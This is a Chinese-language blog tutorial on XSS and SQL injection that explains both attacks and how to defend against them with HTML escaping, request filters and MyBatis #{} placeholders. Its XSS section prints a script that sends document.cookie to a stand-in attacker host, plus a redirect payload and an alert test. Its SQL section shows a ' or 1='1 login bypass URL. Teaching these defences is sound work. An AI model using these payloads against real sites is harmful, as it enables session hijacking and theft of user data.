---
title: xss和sql注入
tags: web安全
categories: 架构设计
abbrlink: 2537856230
date: 2020-01-08 13:46:29
updated: 2020-01-08 14:16:21
---
## 目的
    1.避免代码被攻击
    2.如何做到项目安全保障
## 项目安全隐患
    1.代码
    2.业务逻辑
    3.应用

## web安全常用攻击手段
    xss
    sql注入
    防盗链
## 什么是XSS攻击?
    Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。
    攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。
    利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。
    为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。
    
    XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；
    浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。
  
## 常见的XSS危害举例
    1.盗取cookie,通过cookie信息伪造请求
       <script>
        // 通过动态构造一个img标签，将当前页面的cookie发送给attack.com
        new Image().src = "http://attacker.ip/" + document.cookie;
       </script>
    2.钓鱼
    eg: 在一个页面提交表单后，到另一个页面展示，可能会受到XSS脚本注入，读取本地cookie远程发送给黑客服务器端。
    eg: 链接中包含用户信息，被第三方拦截，添加js脚本，跳转到钓鱼网站的转账页面，用户未能识别钓鱼网站而被骗
    例如:某wx群分享了一个连接,点击这个连接，打开后的网址和某宝极其相似,比如类似这种www.taoobao.com
    你如果没有区分出网址的错误,而在打开的连接中输入转账信息的表单,这个页面带着你的转账信息+<js跳转转账网址>
    又调到了转账页面,一点击转账,凉了...
    测试脚本:
    <script>alert('sss')</script>
    eg: 比如论坛或者贴吧的评论区,如果不对xss攻击进行处理,比如类似如下这种
    <script>window.location.href='http://www.baidu.com';</script>
    那么当普通用户进入评论页,会自动跳转到www.baidu.com,自己的网站被别人引流了,惨不惨!!
## 如何防御XSS攻击?
    将脚本特殊字符，转换成html源代码进行展示。比如'<' 在html想展示符号内容而不是被浏览器解析,需要转为&lt;
    测试脚本处理后对应html源代码: &lt;script&gt;alert('sss')&lt;/script&gt;
    项目一般处理方式:写一个过滤器,拦截所有请求,将参数中的特殊字符进行过滤处理
     可以借助commons包下工具类,完成特殊字符转换
     <dependency>
        <groupId>commons-lang</groupId>
        <artifactId>commons-lang</artifactId>
        <version>2.6</version>
      </dependency>
      
   ![](/images/security/common.png)
## sql注入
    根据sql语法,输入相关字符,改变原sql形成攻击sql
    如:mybatis 中$符号拼接sql时需要程序员添加',这里当攻击者通过'的技巧输入形成新sql,从而直接对MYSQL进行数据攻击
    eg: select username,password from user where user='${username}' and password='${password}';
    当攻击url: http://ip:port/find?username=zhangsan&password='or 1= '1
    形成攻击sql:select username,password from user where user='zhangsan' and password='' or 1 ='1';
    后果: 可完成查询所有用户数据,用户数据泄露
## 如何防御sql攻击
    1.编写dao层尽量不要使用sql拼接,使用预编译方式,比如mybatis中的#替换$
    2.如果使用了sql拼接,要对入参含有特殊字符进行处理
## MyBatis #与$区别
    #{}: 解析为一个 JDBC 预编译语句（prepared statement）的参数标记符，一个 #{} 被解析为一个参数占位符,可以防止SQL注入问题。
    ${}: 仅仅为一个纯碎的 string 替换，在动态 SQL 解析阶段将会进行变量替换。